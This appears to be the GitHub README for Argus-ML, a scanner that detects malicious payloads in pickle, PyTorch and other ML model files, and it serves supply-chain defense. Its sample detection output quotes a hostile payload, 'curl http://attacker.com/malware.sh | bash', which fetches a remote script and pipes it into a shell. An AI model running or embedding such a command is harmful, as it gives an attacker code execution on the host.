# 🛡️ Argus-ML

> Advanced AI/ML Supply Chain Security Scanner for detecting malicious payloads, hidden RCE chains, and weaponized model files.

---

## 📌 Overview

**Argus-ML** is a multi-layered AI model security scanner built to detect Remote Code Execution (RCE), reverse shells, malicious deserialization payloads, and hidden supply chain attacks embedded inside AI/ML model files.

As open-source model distribution becomes the standard across the AI ecosystem, attackers are increasingly abusing formats like Pickle, PyTorch, Keras, GGUF, and ONNX to weaponize models.

This attack pattern — often called **Model Jacking** — allows threat actors to execute code the moment a model is loaded into memory.

Argus-ML is designed to stop that attack chain *before* the victim runs `load()`.

---

# 🔥 Key Features

## 🧠 Multi-Engine Static Analysis

Argus-ML combines multiple detection layers instead of relying on a single scanner.

### Detection Engines

* `pickletools` opcode disassembly
* `picklescan` signature analysis
* Universal binary heuristic scanner
* Payload string extraction
* Embedded shell detection
* Suspicious import tracing
* Dangerous function discovery

---

## 🤖 AI-Powered Threat Intelligence

Argus-ML can leverage multiple LLM providers to explain:

* Attacker intent
* Payload behavior
* Exploitation flow
* Persistence logic
* Reverse shell execution chains
* Supply chain impact

### Supported AI Providers

* NVIDIA Build (Llama 3.1 / 3.3)
* Google Gemini
* OpenAI

The scanner automatically falls back between providers if one is unavailable.

---

## 📦 Universal Model Format Support

### Pickle-Based Formats

* `.pkl`
* `.pickle`
* `.pk1`
* `.pt`
* `.pth`
* `.bin`
* `.joblib`

### Scientific Formats

* `.npy`
* `.npz`

### Deep Learning Formats

* `.h5`
* `.hdf5`
* `.keras`
* `.pb`

### Modern LLM Formats

* `.safetensors`
* `.gguf`
* `.onnx`

### Advanced Detection Capabilities

* Detects suspicious pickle opcodes
* Detects embedded shell payloads
* Detects malicious deserialization chains
* Detects suspicious command execution patterns
* Scans internal PyTorch ZIP pickles automatically

---

# 🚀 Installation

Ensure you have **Python 3.10+** installed.

## Clone Repository

```bash
git clone https://github.com/giriaryan694-a11y/argus-ml.git
cd argus-ml
```

## Install Dependencies

```bash
pip install -r requirements.txt
```

---

# ⚙️ Configuration

Open `argus-ml.py` and configure your API keys.

```python
nvidia_build_api_key = "YOUR_NV_KEY"
gemini_api_key = "YOUR_GEMINI_KEY"
openai_api_key = "YOUR_OPENAI_KEY"
```

Argus-ML includes automatic provider fallback logic.

If one provider fails or is missing, the scanner attempts the next available engine automatically.

---

# 📖 Usage

## 🔍 Scan a Single Model

```bash
python argus-ml.py --target malicious_model.pt --provider nvidia
```

---

## 📂 Scan an Entire Directory (Recursive)

```bash
python argus-ml.py --dir ./models --output security_report --ft html
```

---

## ⚡ Static Analysis Only

Run without AI providers:

```bash
python argus-ml.py --target weight_file.bin --no-ai
```

---

# 📊 Real-World Detection Example

When scanning a malicious PyTorch sample like `devsforcode.pt`, Argus-ML immediately identifies the embedded exploit chain.

```plaintext
[!] Detected PyTorch ZIP Archive format.
[*] Running static analysis...

Dangerous opcodes found:
  [CRITICAL] STACK_GLOBAL: posix system
  [CRITICAL] REDUCE: executes loaded function with arguments

Suspicious strings:
  [CRITICAL] PAYLOAD: 'curl http://attacker.com/malware.sh | bash'

Verdict: UNSAFE - Malicious Code/Payloads Detected.

=== AI Analysis (NVIDIA - Llama-3.1-8b) ===
1. Command Logic: The attacker is using 'curl' to fetch a remote shell script and piping it directly into 'bash' for immediate execution.
2. Impact: Full Remote Code Execution (RCE). The attacker gains a shell on the host machine as soon as the model is loaded into a Python environment.
```

---

# 🖼️ Demo Screenshots

## Detection Results

![Detection Screenshot 1](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/1.png)

![Detection Screenshot 2](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/2.png)

---

## API Configuration

![API Config](https://raw.githubusercontent.com/giriaryan694-a11y/argus-ml/refs/heads/main/screenshots/api.png)

---

# 🎯 Threat Model

Argus-ML is designed against modern AI supply chain attack patterns including:

* Weaponized Pickle deserialization
* Reverse shell execution payloads
* Malicious model repositories
* Dependency confusion delivery chains
* Embedded downloader malware
* Hidden command execution
* GGUF metadata exploitation
* Unsafe PyTorch archives
* AI model trojans
* Loader-triggered RCE

---

# 🛠️ Security Philosophy

Traditional malware scanners were never designed for AI model ecosystems.

Argus-ML focuses specifically on:

* AI model attack surfaces
* Serialization abuse
* ML supply chain compromise
* Deserialization-based RCE
* Model trust exploitation
* AI repository poisoning

The goal is simple:

> Never trust a model file blindly.

---

# ⚖️ License

Licensed under the **Apache License 2.0**.

See the `LICENSE` file for full details.

---

# 🔗 Repository

GitHub Repository:

[https://github.com/giriaryan694-a11y/argus-ml](https://github.com/giriaryan694-a11y/argus-ml)

---

# 👨‍💻 Author

Developed by **Aryan Giri**

Focused on:

* AI Security
* Offensive Security
* Supply Chain Defense
* Model Malware Analysis
* LLM Threat Research

---

# ⭐ Why Argus-ML Matters

The AI ecosystem is rapidly becoming the next major supply chain battlefield.

Attackers no longer need phishing emails when they can hide malware directly inside model weights downloaded by developers worldwide.

Argus-ML helps security researchers, developers, red teamers, and AI engineers inspect model files before they become initial access vectors.

---

# 🌟 Star the Repository

If you found this project useful, consider starring the repository and contributing to the future of AI supply chain security.
